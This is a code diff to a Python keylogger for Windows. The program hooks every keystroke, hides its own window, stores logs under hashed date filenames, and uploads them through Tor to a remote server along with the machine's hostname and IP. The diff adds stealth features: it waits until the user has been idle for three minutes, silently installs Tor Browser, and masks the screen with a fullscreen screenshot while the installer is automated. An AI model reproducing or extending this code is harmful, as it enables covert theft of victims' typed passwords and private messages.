@@ -32,9 +32,10 @@ mode = sys.argv[1]
 if mode != "debug":
     hide()
 
-
-import keyboard            # for keyboard hooks. See docs https://github.com/boppreh/keyboard
-import psutil
+from keyboard import is_pressed, hook, wait, get_hotkey_name  
+# for keyboard hooks. See docs https://github.com/boppreh/keyboard
+from psutil import pids as psutil_pids, Process as psutil_Process
+import signal
 from ctypes import WinDLL  # for getting window titles, current keyboard layout and capslock state
 import urllib.request
 import datetime            # for getting the current time and using timedelta
@@ -43,18 +44,18 @@ from Cryptodome.Cipher import PKCS1_OAEP
 import Cryptodome.Util
 from Cryptodome.Hash import SHA3_512
 import base64
-import hashlib             # for hashing the names of files
-import multiprocessing
-import threading
-from subprocess import run as subprocess_run
-import requests
+from hashlib import md5 as hashlib_md5             # for hashing the names of files
+from multiprocessing import Process as multiprocessing_Process
+from threading import Thread as threading_Thread
+from requests import get as requests_get, post as requests_post, exceptions as requests_exceptions
 import socks
-import socket
+from socket import getfqdn as socket_getfqdn
 from random import choice, shuffle
 from pywinauto.application import Application
 import pywinauto.timings
 import tkinter as tk
 from PIL import Image, ImageGrab, ImageTk
+import numpy as np
 import re
 import time
 
@@ -342,6 +343,7 @@ def check_if_tor_browser_is_installed():
 
 
 def show_screenshot():
+    tk.Tk().withdraw()
     root = tk.Toplevel()
     w, h = root.winfo_screenwidth(), root.winfo_screenheight()
     root.overrideredirect(1)
@@ -349,12 +351,52 @@ def show_screenshot():
     root.focus_set()
     root.bind("<Escape>", lambda e: (e.widget.withdraw(), e.widget.quit()))
     canvas = tk.Canvas(root, width=w, height=h)
-    canvas.pack()
+    canvas.pack(in_=root)
     canvas.configure(background='black')
     screenshot = ImageGrab.grab()
     ph = ImageTk.PhotoImage(screenshot)
     canvas.create_image(w/2, h/2, image=ph)
+    root.wm_attributes("-topmost", 1)
     root.mainloop()
+    return
+
+
+def count_image_diff(img1, img2):
+    s = 0
+    if img1.getbands() != img2.getbands():
+        return -1
+    for band_index, band in enumerate(img1.getbands()):
+        m1 = np.array([p[band_index] for p in img1.getdata()]).reshape(*img1.size)
+        m2 = np.array([p[band_index] for p in img2.getdata()]).reshape(*img2.size)
+        s += np.sum(np.abs(m1 - m2))
+    return s
+
+
+def has_screen_changed(screenshot_1):
+    screenshot_2 = ImageGrab.grab()
+    diff = count_image_diff(screenshot_1, screenshot_2)
+    if diff < 1000000:  # a change significant enough
+        return False, screenshot_2
+    else:
+        return True, screenshot_2
+
+
+def detect_user_inactivity():
+    # Detect user inactivity by detecting screen change + mouse movement + key press
+    seconds_inactive = 0
+    screenshot_1 = ImageGrab.grab()
+    mouse_saved_pos = win32api.GetCursorPos()
+    keys_saved_pressed = get_hotkey_name()
+    sleep = 20  # seconds
+    while seconds_inactive < 180:  # 3 minutes of mouse + keyboard + screen inactivity
+        screen_changed, screen_pic = has_screen_changed(screenshot_1)
+        mouse_pos, keys_pressed = win32api.GetCursorPos(), get_hotkey_name()
+        if screen_changed or mouse_saved_pos != mouse_pos or keys_saved_pressed != keys_pressed:
+            mouse_saved_pos, keys_saved_pressed = mouse_pos, keys_pressed
+            seconds_inactive = 0
+        else:
+            seconds_inactive += sleep
+        time.sleep(sleep)
     return
 
 
@@ -363,29 +405,37 @@ def install_tor_browser():
         return  # TODO: Linux, MacOS
     # 1. Download the installer
     try:
-        r = requests.get("http://www.torproject.org/download/")
+        r = requests_get("http://www.torproject.org/download/")
         if r.status_code == 200:
             tor_windows_url = r.text.split(".exe")[0].split("href=\"")[-1] + ".exe"
         else:
             tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
-    except requests.exceptions.ConnectionError:
+    except requests_exceptions.ConnectionError:
         tor_windows_url = "https://www.torproject.org/dist/torbrowser/8.5.5/torbrowser-install-win64-8.5.5_en-US.exe"
     try:
-        tor_installer = requests.get(tor_windows_url)
-    except requests.exceptions.ConnectionError:
+        tor_installer = requests_get(tor_windows_url)
+    except requests_exceptions.ConnectionError:
         return
     installer_path = os.path.join(dir_path, tor_windows_url.split("/")[-1])
-    open(installer_path, 'wb').write(tor_installer.content)
+    try: open(installer_path, 'wb').write(tor_installer.content)
+    except: return
     # 2. Install
     installation_dir = os.path.join(dir_path, "Tor_Browser")
-    os.remove(installation_dir)
+    if os.path.exists(installation_dir):
+        try: os.remove(installation_dir)
+        except: return
 
-    screenshot_process = multiprocessing.Process(target=show_screenshot, args=())
+    detect_user_inactivity()
+
+    screenshot_process = multiprocessing_Process(target=show_screenshot, args=())
     screenshot_process.start()
+
+    time.sleep(5)
 
     try:
         app = Application(backend="win32").start(installer_path)
     except:
+        screenshot_process.terminate()
         return
     try:
         app.Dialog.OK.wait('ready', timeout=30)
@@ -403,32 +453,37 @@ def install_tor_browser():
             pass
     except pywinauto.timings.TimeoutError:
         app.kill()
+        screenshot_process.terminate()
+        return
     try:
-        app.InstallDialog.CheckBox.wait('ready', timeout=30).uncheck()
-        app.InstallDialog.CheckBox2.wait('ready', timeout=30).uncheck()
+        app.InstallDialog.CheckBox.wait('ready', timeout=120).uncheck()
+        app.InstallDialog.CheckBox2.wait('ready', timeout=120).uncheck()
         app.InstallDialog.FinishButton.wait('ready', timeout=30).click()
     except pywinauto.timings.TimeoutError:
         app.kill()
+        screenshot_process.terminate()
+        return
 
     screenshot_process.terminate()
 
     # 3. Remove the installer
     os.remove(installer_path)
-    return tor_installation_dir
+
+    return installation_dir
 
 
 def is_tor_browser_already_open(program_path):
-    for pid in psutil.pids():  # Iterates over all process-ID's found by psutil
+    for pid in psutil_pids():  # Iterates over all process-ID's found by psutil
         try:
-            p = psutil.Process(pid)  # Requests the process information corresponding to each process-ID,
-            # the output wil look (for example) like this: <psutil.Process(pid=5269, name='Python') at 4320652312>
+            p = psutil_Process(pid)  # Requests the process information corresponding to each process-ID,
+            # the output wil look (for example) like this: <psutil_Process(pid=5269, name='Python') at 4320652312>
             if program_path in p.exe():  # checks if the value of the program-variable
                 # that was used to call the function matches the name field of the plutil.Process(pid)
                 # output (see one line above).
-                return True, p.exe()
+                return pid, p.exe()
         except:
             continue
-    return False, None
+    return None, None
 
 
 def find_top_windows(wanted_text=None, wanted_class=None, selection_function=None):
@@ -456,6 +511,12 @@ def find_top_windows(wanted_text=None, wanted_class=None, selection_function=Non
         Useful for matching control text """
         return control_text.lower().replace('&', '')
 
+    def _windowEnumerationHandler(hwnd, resultList):
+        '''Pass to win32gui.EnumWindows() to generate list of window handle,
+        window text, window class tuples.'''
+        resultList.append((hwnd,
+                           win32gui.GetWindowText(hwnd),
+                           win32gui.GetClassName(hwnd)))
     results = []
     top_windows = []
     win32gui.EnumWindows(_windowEnumerationHandler, top_windows)
@@ -470,17 +531,25 @@ def find_top_windows(wanted_text=None, wanted_class=None, selection_function=Non
     return results
 
 
-def open_tor_browser(installation_dir):
+def open_tor_browser(tor_installation_dir):
     user32 = WinDLL('user32')
-    os.startfile(os.path.join(os.path.split(os.path.split(installation_dir)[0])[0], "Start Tor Browser.lnk"))
+    os.startfile(os.path.join(tor_installation_dir, "Start Tor Browser.lnk"))
     start_time = time.time()
-    while time.time() - start_time < 60:
+    check_1 = check_2 = False
+    while time.time() - start_time < 5:
         hwnd_1 = find_top_windows(wanted_text="Establishing a Connection", wanted_class='MozillaDialogClass')
         hwnd_2 = find_top_windows(wanted_text="About Tor", wanted_class='MozillaWindowClass')
         if len(hwnd_1) == 1:
             user32.ShowWindow(hwnd_1[0], 0)
+            check_1 = True
         if len(hwnd_2) == 1:
             user32.ShowWindow(hwnd_2[0], 0)
+            check_2 = True
+            break
+    if not (check_1 and check_2):
+        pid, _ = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
+        if pid:
+            os.kill(pid, 9)
 
 
 def find_the_previous_log_and_send():
@@ -491,20 +560,21 @@ def find_the_previous_log_and_send():
     delta = 1
     while delta <= 366:
         previous_date = (datetime.date.today() - timedelta(days=delta)).strftime('%Y-%b-%d')
-        previous_date_hashed = hashlib.md5(bytes(previous_date, 'utf-8')).hexdigest()
+        previous_date_hashed = hashlib_md5(bytes(previous_date, 'utf-8')).hexdigest()
         if os.path.exists(previous_date_hashed + ".txt"):
             found_filenames.append(previous_date_hashed + ".txt")
         delta += 1
     # check if TOR is opened/installed
-    is_tor_open, tor_installation_dir = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
+    open_tor_pid, tor_installation_dir = is_tor_browser_already_open(program_path='Tor Browser\\Browser\\firefox.exe')
     if not tor_installation_dir:
         tor_installation_dir = check_if_tor_browser_is_installed()
     # if not tor_installation_dir:
-    tor_installation_dir = install_tor_browser()
+    tor_installation_dir = install_tor_browser()                                 # add indent
+    tor_installation_dir = os.path.split(os.path.split(tor_installation_dir)[0])[0]  # add indent
     if not tor_installation_dir:
         return True  # ONE DOES NOT SIMPLY USE CLEARNET.
     else:  # USE DARKNET ONLY
-        if not is_tor_open:
+        if not open_tor_pid:
             open_tor_browser(tor_installation_dir)
         for found_filename in found_filenames:
             # Now that we found the old log files (found_filename), send them to our server.
@@ -518,18 +588,18 @@ def find_the_previous_log_and_send():
             counter = 0
             while counter < 5:
                 try:
-                    r = requests.get(server_parser_list[counter][0])
+                    r = requests_get(server_parser_list[counter][0])
                     if r.status_code == 200:
                         ip = eval(server_parser_list[counter][1])
                         break
-                except requests.exceptions.ConnectionError:
+                except requests_exceptions.ConnectionError:
                     pass
                 counter += 1
-            new_found_filename = str(socket.getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
+            new_found_filename = str(socket_getfqdn()) + ("_" if ip != "" else "") + ip + "_" + found_filename
             os.rename(found_filename, new_found_filename)  # rename the file to avoid async errors
-            sent_status_code = requests.get(url_server_check_connection, proxies=proxies).status_code
+            sent_status_code = requests_get(url_server_check_connection, proxies=proxies).status_code
             if sent_status_code == 200:  # send logs
-                uploaded_status = requests.post(url_server_upload,
+                uploaded_status = requests_post(url_server_upload,
                                                 proxies=proxies,
                                                 data=open(new_found_filename, "rb").read()).status_code
                 if uploaded_status == 200:
@@ -542,12 +612,12 @@ def log_local():
     global dir_path, line_buffer, backspace_buffer_len, window_name, time_logged
     todays_date = datetime.datetime.now().strftime('%Y-%b-%d')
     # md5 only for masking dates - it's easily crackable for us:
-    todays_date_hashed = hashlib.md5(bytes(todays_date, 'utf-8')).hexdigest()
+    todays_date_hashed = hashlib_md5(bytes(todays_date, 'utf-8')).hexdigest()
     # We need to check if it is a new day, if so, send the old log to the server.
     if not os.path.exists(todays_date_hashed + ".txt"):  # a new day, a new life...
         if mode == "remote":
             # Evaluate find_the_previous_log_and_send asynchronously
-            thr = threading.Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
+            thr = threading_Thread(target=find_the_previous_log_and_send, args=(), kwargs={})
             thr.start()
             # thr.is_alive()  # check if it is alive
             # thr.join()
@@ -630,9 +700,9 @@ def key_callback(event):
     # 3. DETERMINE THE KEY_PRESSED GIVEN THE EVENT
     if event.name in ['left', 'right']:  # arrow keys  # 'home', 'end', 'up', 'down'
         key_pressed_list = list()
-        if keyboard.is_pressed('ctrl') or keyboard.is_pressed('right ctrl'):
+        if is_pressed('ctrl') or is_pressed('right ctrl'):
             key_pressed_list.append('ctrl')
-        if keyboard.is_pressed('shift') or keyboard.is_pressed('right shift'):
+        if is_pressed('shift') or is_pressed('right shift'):
             key_pressed_list.append('shift')
         key_pressed = '<' + '+'.join(key_pressed_list) + (
             '+' if len(key_pressed_list) > 0 else '') + event.name + '>'
@@ -693,8 +763,8 @@ def key_callback(event):
 
 def main():
     # KEYLOGGER STARTS
-    keyboard.hook(key_callback)
-    keyboard.wait()
+    hook(key_callback)
+    wait()
     return
 
 
